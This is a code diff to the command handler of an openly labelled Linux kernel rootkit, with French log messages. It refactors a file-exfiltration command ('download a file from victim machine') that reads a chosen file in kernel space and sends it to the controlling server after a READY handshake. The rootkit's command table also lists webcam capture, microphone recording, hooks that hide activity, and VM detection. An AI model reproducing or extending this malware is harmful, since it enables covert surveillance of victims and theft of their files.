@@ -22,11 +22,19 @@
 
 extern struct socket *get_worker_socket(void);
 
+
+// ===== UPLOAD =====
 static bool receiving_file = false;
 static char *upload_path = NULL;
 static char *upload_buffer = NULL;
 static long upload_size = 0;
 static long upload_received = 0;
+
+// ===== DOWNLOAD =====
+static bool sending_file = false;
+static char *download_buffer = NULL;
+static long download_size = 0;
+
 
 // Handler prototypes
 static int connect_handler(char *args);
@@ -46,8 +54,8 @@ static int start_webcam_handler(char *args);
 static int capture_image_handler(char *args);
 static int start_microphone_handler(char *args);
 static int play_audio_handler(char *args);
-static int get_file_handler(char *args);
 static int upload_handler(char *args);
+static int download_handler(char *args);
 static int sysinfo_handler(char *args);
 static int is_in_vm_handler(char *args);
 
@@ -70,8 +78,8 @@ static struct command rootkit_commands_array[] = {
     { "start_microphone", 15, "start recording from microphone", 31, start_microphone_handler },
     { "play_audio", 10, "play an audio file", 18, play_audio_handler },
     { "hooks", 5, "manage hide/forbid/alter rules", 30, hooks_menu_handler },
-    { "get_file", 8, "download a file from victim machine", 35, get_file_handler },
     { "upload", 6, "receive a file and save it on disk", 34, upload_handler },
+    { "download", 8, "download a file from victim machine", 35, download_handler },
     { "sysinfo", 7, "get system information in JSON format", 37, sysinfo_handler },
     { "is_in_vm", 8, "check if remote rootkit is running in vm", 40, is_in_vm_handler },
     { NULL, 0, NULL, 0, NULL }
@@ -144,6 +152,16 @@ int rootkit_command(char *command, unsigned command_size) {
         }
     
         return 0;  // Ne traite pas comme commande normale
+
+    } else if (sending_file && strncmp(command, "READY", 5) == 0) {
+        DBG_MSG("rootkit_command: envoi fichier (%ld octets)\n", download_size);
+        send_to_server(download_buffer);
+
+        kfree(download_buffer);
+        download_buffer = NULL;
+        download_size = 0;
+        sending_file = false;
+        return 0;
     }
     
     // Remove newline character if present
@@ -554,31 +572,29 @@ static int upload_handler(char *args) {
     return 0;
 }
 
-static int get_file_handler(char *args) {
+static int download_handler(char *args) {
     if (!args || !*args) {
-        send_to_server("Usage: get_file <path>\n");
+        send_to_server("Usage: download <path>\n");
         return -EINVAL;
     }
 
-    DBG_MSG("get_file_handler: lecture fichier %s\n", args);
+    DBG_MSG("download_handler: lecture fichier %s\n", args);
 
     struct file *filp = filp_open(args, O_RDONLY, 0);
     if (IS_ERR(filp)) {
-        ERR_MSG("get_file_handler: impossible d’ouvrir %s\n", args);
+        ERR_MSG("download_handler: impossible d’ouvrir %s\n", args);
         send_to_server("❌ Impossible d’ouvrir le fichier.\n");
         return PTR_ERR(filp);
     }
 
     loff_t pos = 0;
     int size = i_size_read(file_inode(filp));
-
     if (size <= 0) {
         filp_close(filp, NULL);
         send_to_server("❌ Fichier vide ou erreur.\n");
         return -EINVAL;
     }
 
-    // Allouer et lire le fichier
     char *buffer = kmalloc(size, GFP_KERNEL);
     if (!buffer) {
         filp_close(filp, NULL);
@@ -586,17 +602,25 @@ static int get_file_handler(char *args) {
         return -ENOMEM;
     }
 
-    kernel_read(filp, buffer, size, &pos);
+    int read_bytes = kernel_read(filp, buffer, size, &pos);
     filp_close(filp, NULL);
 
-    // Stocker pour envoi après "READY"
-    upload_buffer = buffer;
-    upload_size = size;
-    upload_received = 0;
-    receiving_file = false;
+    if (read_bytes != size) {
+        ERR_MSG("download_handler: erreur lecture fichier (%d / %d)\n", read_bytes, size);
+        kfree(buffer);
+        send_to_server("❌ Erreur lecture fichier.\n");
+        return -EIO;
+    }
 
-    send_to_server("SIZE %d\n", size);
-    DBG_MSG("get_file_handler: prêt à envoyer %d octets\n", size);
+    // Enregistrement du buffer pour envoi différé
+    download_buffer = buffer;
+    download_size = size;
+    sending_file = true;
 
+    char size_msg[64];
+    snprintf(size_msg, sizeof(size_msg), "SIZE %ld\n", download_size);
+    send_to_server(size_msg);
+
+    DBG_MSG("download_handler: prêt à envoyer %ld octets après READY\n", download_size);
     return 0;
 }
